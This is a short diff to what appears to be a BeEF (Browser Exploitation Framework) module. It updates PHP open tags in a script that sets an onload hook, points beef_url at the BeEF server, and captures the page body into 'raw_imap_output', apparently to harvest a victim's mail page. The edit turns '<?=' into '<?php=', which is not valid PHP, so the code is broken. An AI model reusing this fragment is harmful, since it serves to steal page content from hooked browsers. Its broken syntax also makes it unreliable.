@@ -1,4 +1,4 @@
-<?
+<?php
 	// Copyright (c) 2006-2009, Wade Alcorn 
 	// All Rights Reserved
 	// wade@bindshell.net - http://www.bindshell.net
@@ -8,7 +8,7 @@
 
 onload = beef_onload;
 
-beef_url = "<?= BEEF_DOMAIN; ?>";
+beef_url = "<?php= BEEF_DOMAIN; ?>";
 
 function beef_onload() {
 	raw_imap_output=document.body.innerHTML;
